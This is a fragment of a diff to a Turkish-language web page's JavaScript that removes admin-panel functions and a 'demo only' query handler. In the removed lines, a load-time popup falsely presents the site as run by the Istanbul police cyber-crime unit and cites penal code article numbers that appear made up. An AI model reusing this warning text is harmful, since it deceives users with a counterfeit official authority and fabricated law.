-
-    function clearAllData() {
-        if (systemManager && systemManager.clearAllData()) {
-            Swal.fire('Başarılı!', 'Tüm veriler temizlendi', 'success');
-            closeAdminPanel();
-        }
-    }
-
-    function filterLogs(searchTerm) {
-        const rows = document.querySelectorAll('#recentLogs tbody tr');
-        searchTerm = searchTerm.toLowerCase();
-        
-        rows.forEach(row => {
-            const text = row.textContent.toLowerCase();
-            row.style.display = text.includes(searchTerm) ? '' : 'none';
-        });
-    }
-
-    // ==================== MEVCUT FONKSİYONLAR ====================
-    window.addEventListener("load", function () {
-        Swal.fire({
-            title: "ÖNEMLİ UYARI",
-            text: "Bu site İstanbul Emniyet Genel Müdürlüğü Siber Suçlarla Mücadele Daire Başkanlığı tarafından kurulmuş olup taklidi maksatıyla oluşturulan siteler TCK 9312, 9521, 9552 kanunları gereğince kapatılacaktır. Sayfada yapılan herhangi bir sorgunun İEGMSSM Kullanım Hakları dışında kullanılması durumunda TCK 10212, 10213, 10251 kanunları gereğince kullanıcı açığa alınır veya ihtar uygulanır.",
-            icon: "info",
-            showConfirmButton: true,
-            confirmButtonText: "Yönetici Girişi",
-            denyButtonText: "Anlaşıldı",
-            allowOutsideClick: false,
-            allowEscapeKey: false,
-            didOpen: () => {
-                const denyButton = Swal.getDenyButton();
-                denyButton.style.display = "none";
-                setTimeout(() => {
-                    denyButton.style.display = "inline-block";
-                }, 20);
-            }
-        }).then((result) => {
-            if (result.isConfirmed) {
-                openAdminPanel();
-            }
-        });
-    });
-
-    function toggleCategory(categoryElement) {
-        // event kontrolü
-        if (!event || !event.target) return;
-        
-        if (event.target.closest('.query-item')) {
-            return;
-        }
-        categoryElement.classList.toggle('expanded');
-    }
-
-    function executeQuery(protocol) {
-        // event kontrolü
-        if (!event) return;
-        event.stopPropagation(); 
-        
-        const item = event.target.closest('.query-item');
-        if (item) {
-            item.style.background = 'rgba(0, 255, 255, 0.15)';
-        }
-        
-        setTimeout(() => {
-            Swal.fire('Demo', 'Bu sadece demo amaçlıdır. Gerçek sorgu yapılmaz.', 'info');
-        }, 200);
-    }
-
-    // Admin panel açma kısayolu (Ctrl+Shift+A)
-    document.addEventListener('keydown', function(e) {
-        if (e.ctrlKey && e.shiftKey && e.key === 'A') {
-            e.preventDefault();
-            openAdminPanel();
-        }
-    });
-
-    // Overlay tıklayınca paneli kapat
-    const overlay = document.getElementById('adminOverlay');
-    if (overlay) {
-        overlay.addEventListener('click', closeAdminPanel);
-    }
-
-    // Global fonksiyonlar
-    window.systemManager = systemManager;
-    window.openAdminPanel = openAdminPanel;
-    window.closeAdminPanel = closeAdminPanel;
-    window.switchTab = switchTab;
-    window.blockIP = blockIP;
-    window.deleteIPData = deleteIPData;
-    window.saveSettings = saveSettings;
-    window.exportData = exportData;
-    window.importData = importData;
-    window.clearAllData = clearAllData;
-    window.filterLogs = filterLogs;
-    window.toggleCategory = toggleCategory;
-    window.executeQuery = executeQuery;
+    
+    // Global erişim
+    window.simpleSystem = simpleSystem;
     </script>
 </body>
 </html>
